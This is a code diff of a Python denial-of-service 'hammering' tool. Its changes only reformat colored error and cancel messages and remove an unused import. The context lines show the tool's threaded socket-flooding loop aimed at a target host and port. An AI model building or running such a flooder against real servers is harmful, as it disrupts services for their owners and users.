@@ -22,7 +22,6 @@
 """
 
 import socket
-import time
 import random
 from threading import Thread
 from config import Config, Bcolors
@@ -58,18 +57,42 @@ def hammering():
                                 (ip, port),
                             )
                         except socket.error:
-                            print(Bcolors.WARNING + "ERROR, Maybe the host is down?!?!")
+                            print(
+                                Bcolors.WARNING
+                                + "ERROR, Maybe the host is down?!?!"
+                                + Bcolors.ENDC
+                            )
                         except KeyboardInterrupt:
                             print(
-                                Bcolors.BOLD + Bcolors.FAIL + "\r\n[-] Canceled by user"
+                                Bcolors.BOLD
+                                + Bcolors.FAIL
+                                + "\r\n[-] Canceled by user"
+                                + Bcolors.ENDC
+                                + Bcolors.ENDC
                             )
                 except socket.error:
-                    print(Bcolors.WARNING + "ERROR, Maybe the host is down?!?!")
+                    print(
+                        Bcolors.WARNING
+                        + "ERROR, Maybe the host is down?!?!"
+                        + Bcolors.ENDC
+                    )
                 except KeyboardInterrupt:
-                    print(Bcolors.BOLD + Bcolors.FAIL + "\r\n[-] Canceled by user")
+                    print(
+                        Bcolors.BOLD
+                        + Bcolors.FAIL
+                        + "\r\n[-] Canceled by user"
+                        + Bcolors.ENDC
+                        + Bcolors.ENDC
+                    )
                 dosSocket.close()
         except KeyboardInterrupt:
-            print(Bcolors.BOLD + Bcolors.FAIL + "\r\n[-] Canceled by user")
+            print(
+                Bcolors.BOLD
+                + Bcolors.FAIL
+                + "\r\n[-] Canceled by user"
+                + Bcolors.ENDC
+                + Bcolors.ENDC
+            )
 
     print(f" [+] Hammering server {host}")
     try:
@@ -78,6 +101,18 @@ def hammering():
                 t = Thread(target=goForDosThatThing)
                 t.start()
             except KeyboardInterrupt:
-                print(Bcolors.BOLD + Bcolors.FAIL + "\r\n[-] Canceled by user")
+                print(
+                    Bcolors.BOLD
+                    + Bcolors.FAIL
+                    + "\r\n[-] Canceled by user"
+                    + Bcolors.ENDC
+                    + Bcolors.ENDC
+                )
     except KeyboardInterrupt:
-        print(Bcolors.BOLD + Bcolors.FAIL + "\r\n[-] Canceled by user")
+        print(
+            Bcolors.BOLD
+            + Bcolors.FAIL
+            + "\r\n[-] Canceled by user"
+            + Bcolors.ENDC
+            + Bcolors.ENDC
+        )
